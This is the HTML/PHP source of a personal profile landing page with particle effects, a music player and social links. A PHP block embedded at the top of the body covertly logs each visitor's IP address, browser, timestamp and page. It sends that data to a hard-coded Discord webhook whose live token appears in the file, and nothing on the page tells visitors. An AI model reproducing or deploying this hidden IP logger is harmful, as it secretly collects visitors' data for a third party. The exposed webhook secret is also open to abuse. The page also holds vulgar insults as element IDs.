<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>192.168.3.107</title>
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Comfortaa">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <link rel="icon" type="image/jpg" href="./assets/pfp.jpg">

    <meta content="wlodixowy topka" property="og:title" />
    <meta content="annihilated." property="og:description" />
    <meta content="localhost" property="og:url" />
    <meta content="https://media.discordapp.net/attachments/1046529615839109141/1049818678432112691/in_2022___Drip_outfit_men_Girls_veiled_Cute_poses_for_pictures.jpg?ex=665afb95&is=6659aa15&hm=a274a3587bf9cc5f7cadbfbdfa57b82228d277fc288b44df045fb7dd73c5949f&=&format=webp&width=441&height=587" property="og:image" />
    <meta content="#000000" data-react-helmet="true" name="theme-color" />
    <script src="main.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tsparticles-slim@2.0.6/tsparticles.slim.bundle.min.js"></script>
    
</head>
<body>
    
<?php

function getUserIP() {

    if (!empty($_SERVER['HTTP_CLIENT_IP']) && filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP)) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }

    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        foreach ($ipList as $ip) {
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }

    if (!empty($_SERVER['REMOTE_ADDR']) && filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP)) {
        return $_SERVER['REMOTE_ADDR'];
    }

    return 'UNKNOWN';
}
    if(isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
        $webpage = $_SERVER['SCRIPT_NAME'];
        $timestamp = date('d/m/Y h:i:s');
        $browser = $_SERVER['HTTP_USER_AGENT'];
    }

$userIP = getUserIP();

$webhookURL = "https://canary.discord.com/api/webhooks/1246293267541397646/CsKoBXEalNKnzLDEMhP9x1mAWeoT6aYlFXO4UfXiQjHaMZL-I4cAdPIYu1P_UqpQG1JM";

$data = array(
    "content" => "' \n\nUser IP: " . $userIP . " \n\nData: " . $timestamp . " \n\nPrzegladarka: " . $browser . " \n\nStrona: " . $webpage
);

$options = array(
    "http" => array(
        "header" => "Content-Type: application/json",
        "method" => "POST",
        "content" => json_encode($data)
    )
);
$context = stream_context_create($options);
$result = file_get_contents($webhookURL, false, $context);

?>


    <div class="videosplash" id="twojstarysiekurwi twojastarakurwaparticlesy">
    </div>
    <div class="splashcard" style="z-index:5" id="twojstarypijerompera">
        <button id="przycisk" class="przycisk" onclick=TwojaStara() onclick=TwojaStaraDestroy();>click to enter.</button>
    </div>
    <script type="text/javascript">
        const options = {
          background: {
            color: "#000",
          },
          interactivity: {
            events: {
              onClick: {
                enable: true,
                mode: "push",
              },
              onHover: {
                enable: true,
                mode: "grab",
              },
            },
            modes: {
              push: {
                quantity: 6,
              },
              repulse: {
                distance: 100,
              },
            },
          },
          particles: {
            links: {
              enable: true,
              opacity: 0.3,
              distance: 200,
            },
            move: {
              enable: true, 
              speed: { min: 6, max: 10 },
            },
            opacity: {
              value: { min: 0.3, max: 0.7 }, 
            },
            size: {
              value: { min: 1, max: 3 },
            },
          },
        };
  
       tsParticles.load("twojastarakurwaparticlesy", options).then(function (container) {
            var button = document.getElementById("przycisk"); 
            button.addEventListener("click", function() { 
                setTimeout(function () {
                container.destroy();
                }, 3500);
            }); 
        });

        
      </script>
        <div class="video-container" style="opacity:0; z-index:0" id="twojastaratodziwka">
            <video autoplay muted loop>
                <source src="assets/video/vkie.mp4" type="video/mp4" />
            </video>
            <audio id="bgMusic" autoplay loop>
                <source src="assets/music/vkie.mp3" type="audio/mpeg"/>
            </audio>
            <div class="caption" style="z-index:1">
                <div class="card-container">
                    <div class="card">
                        <p class="typewrite" data-period="100" data-type='[ "anonymous", "discord terminated", "get ratted.", ">aimbot", "OAPIJDSFJN", "l4 1gb/s", "192.168.0.1" ]'>
                            <span class="wrap"></span>
                          </p>
                        <div class="logo"><img src="./assets/pfp.jpg" alt="Logo"></div>
                        <div class="nick">
                            WlodiXowy
                        </div>
                        <div class="icon-links">
                            <a href="https://discord.gg/ssDSxZuGdX" class="icon-link" target="_blank"><i class="fab fa-discord"></i></a>
                            <a href="https://www.youtube.com/channel/UCG-m1TtU4aPkxbieh0G6zrA" class="icon-link" target="_blank"><i class="fab fa-youtube"></i></a>
                            <a href="https://steamcommunity.com/id/WlodiXowy" class="icon-link" target="_blank"><i class="fab fa-steam"></i></a>
                            <a href="https://www.instagram.com/wlodar1337" class="icon-link" target="_blank"><i class="fab fa-instagram"></i></a>
                        </div>
                        <div class="song-card">
                            <div class="song-cover">
                                <img src="./assets/cover.png" alt="Okładka">
                            </div>
                        <div class="song-info">
                        <div class="song-title">Czas Cie goni</div>
                           <div class="song-author">Vkie</div>
                        </div>
                        <!-- Karta do efektu glow (blasku) -->
                        <div class="card-glow"></div>
                        </div>
    
                       <!-- Suwak do regulacji głośności -->
                       <input type="range" id="volumeSlider" min="0" max="1" step="0.1" value="1" oninput="changeVolume()">
                        </div>
                    </div>
                </div>
            </div>
        </div>
    <script>
        const bgMusic = document.getElementById('bgMusic');
        const volumeSlider = document.getElementById('volumeSlider');

        function changeVolume() {
            bgMusic.volume = volumeSlider.value;
        }
    </script>

</body>
</html>